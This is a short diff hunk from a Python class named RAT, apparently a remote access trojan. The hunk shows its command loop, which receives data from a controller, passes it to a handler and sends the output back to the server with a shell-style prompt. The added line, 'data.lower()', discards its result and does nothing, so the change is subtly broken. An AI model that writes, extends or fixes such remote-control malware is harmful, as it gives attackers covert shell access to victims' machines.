@@ -156,6 +156,7 @@ class RAT:
 					cls.send(cls._info + os.getcwd() + "> ")
 				while(cls.FLAG):
 					data = cls.receive()
+					data.lower()
 					stdoutput = cls.data_handler(data)
 					# Send data to server
 					stdoutput += "\n" + os.getcwd() + "> "
